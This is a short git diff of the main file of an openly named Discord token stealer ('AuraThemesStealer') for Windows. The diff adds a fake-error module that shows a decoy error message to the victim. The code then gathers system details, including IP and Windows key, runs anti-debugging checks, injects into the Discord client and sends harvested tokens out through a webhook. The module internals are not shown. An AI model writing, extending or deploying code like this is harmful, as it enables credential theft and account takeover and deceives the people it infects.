@@ -8,7 +8,8 @@ switch (process.platform) {
     case "win32":
         const { getInfo } = require("./modules/core/core");
         const { discordInjected } = require("./modules/injections/discord");
-        const { webhookTokens } = require("./modules/findtokens/send");
+        const { fakeError } = require("./modules/fakeerror/fake");
+        const { webhookTokens } = require("./modules/tokens/send");
         const { antidebug } = require("./modules/antidebug/antidebug");
 
         class AuraThemesStealer {
@@ -18,6 +19,7 @@ switch (process.platform) {
             async aurita() {
                 try {
                     const { DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION } = await getInfo();
+                    fakeError(config.fakeErrorMessage);
                     await antidebug(config.debugger, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
                     await discordInjected(config.injection);
                     await webhookTokens();
